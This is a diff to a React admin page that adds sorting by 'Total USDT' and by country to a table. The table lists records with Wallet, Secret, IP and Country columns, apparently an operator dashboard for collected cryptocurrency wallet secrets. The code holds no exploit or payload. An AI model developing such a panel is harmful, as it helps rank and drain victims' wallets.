@@ -27,7 +27,7 @@ const AdminPage = () => {
   const [totalRecord, setTotalRecords] = useState(1);
   const [currentPage, setCurrentPage] = useState(1);
   const [pageSize] = useState(30);
-  const [sortOrder, setSortOrder] = useState(null); // "asc" | "desc" | null
+  const [sortConfig, setSortConfig] = useState({ key: null, order: null }); // "country" | "total", order: "asc" | "desc"
   const usersRef = collection(db, "mydata");
   const q = query(usersRef, orderBy("createdAt", "desc"));
   const audioRef = useRef(null);
@@ -82,13 +82,22 @@ const AdminPage = () => {
 
       userList = filteredUsers(userList);
 
-      // 🆕 Sort theo country nếu được chọn
-      if (sortOrder) {
+      // 🆕 Sort theo cột nếu được chọn
+      if (sortConfig.key) {
         userList.sort((a, b) => {
-          const countryA = a.ip?.country?.toLowerCase() || "";
-          const countryB = b.ip?.country?.toLowerCase() || "";
-          if (sortOrder === "asc") return countryA.localeCompare(countryB);
-          return countryB.localeCompare(countryA);
+          if (sortConfig.key === "country") {
+            const countryA = a.ip?.country?.toLowerCase() || "";
+            const countryB = b.ip?.country?.toLowerCase() || "";
+            return sortConfig.order === "asc"
+              ? countryA.localeCompare(countryB)
+              : countryB.localeCompare(countryA);
+          }
+          if (sortConfig.key === "total") {
+            const totalA = Number(a.total) || 0;
+            const totalB = Number(b.total) || 0;
+            return sortConfig.order === "asc" ? totalA - totalB : totalB - totalA;
+          }
+          return 0;
         });
       }
 
@@ -98,7 +107,7 @@ const AdminPage = () => {
       setTotalRecords(userList.length);
     };
     fetchData();
-  }, [currentPage, reload, sortOrder]);
+  }, [currentPage, reload, sortConfig]);
 
   const handlePageChange = (page) => {
     setCurrentPage(page);
@@ -138,6 +147,17 @@ const AdminPage = () => {
     setFilter(values);
     setCurrentPage(1);
     setReload((prv) => !prv);
+  };
+
+  const handleSort = (key) => {
+    setSortConfig((prev) => {
+      if (prev.key === key) {
+        if (prev.order === "asc") return { key, order: "desc" };
+        if (prev.order === "desc") return { key: null, order: null };
+      }
+      return { key, order: "asc" };
+    });
+    setReload((prev) => !prev);
   };
 
   return (
@@ -194,25 +214,33 @@ const AdminPage = () => {
                 <th className="py-2 px-4 bg-gray-200">Status</th>
                 <th className="py-2 px-4 bg-gray-200">Wallet</th>
                 <th className="py-2 px-4 bg-gray-200">Secret</th>
-                <th className="py-2 px-4 bg-gray-200">Total USDT</th>
-                <th className="py-2 px-4 bg-gray-200">Time</th>
-                <th className="py-2 px-4 bg-gray-200">IP</th>
+
+                {/* 🆕 Sortable Total USDT Column */}
                 <th
                   className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
-                  onClick={() => {
-                    setSortOrder((prev) => {
-                      if (prev === "asc") return "desc";
-                      if (prev === "desc") return null;
-                      return "asc";
-                    });
-                    setReload((prev) => !prev);
-                  }}
+                  onClick={() => handleSort("total")}
+                >
+                  Total USDT{" "}
+                  {sortConfig.key === "total"
+                    ? sortConfig.order === "asc"
+                      ? "▲"
+                      : "▼"
+                    : ""}
+                </th>
+
+                <th className="py-2 px-4 bg-gray-200">Time</th>
+                <th className="py-2 px-4 bg-gray-200">IP</th>
+
+                {/* 🆕 Sortable Country Column */}
+                <th
+                  className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
+                  onClick={() => handleSort("country")}
                 >
                   Country{" "}
-                  {sortOrder === "asc"
-                    ? "▲"
-                    : sortOrder === "desc"
-                    ? "▼"
+                  {sortConfig.key === "country"
+                    ? sortConfig.order === "asc"
+                      ? "▲"
+                      : "▼"
                     : ""}
                 </th>
                 <th className="py-2 px-4 bg-gray-200">Action</th>
@@ -226,8 +254,7 @@ const AdminPage = () => {
                   <td className="py-2 px-4 border">
                     <span
                       className={`px-2 py-1 rounded text-xs font-medium ${
-                        statusClasses[user.status] ||
-                        "bg-slate-200 text-slate-800"
+                        statusClasses[user.status] || "bg-slate-200 text-slate-800"
                       }`}
                     >
                       {user.status === 0
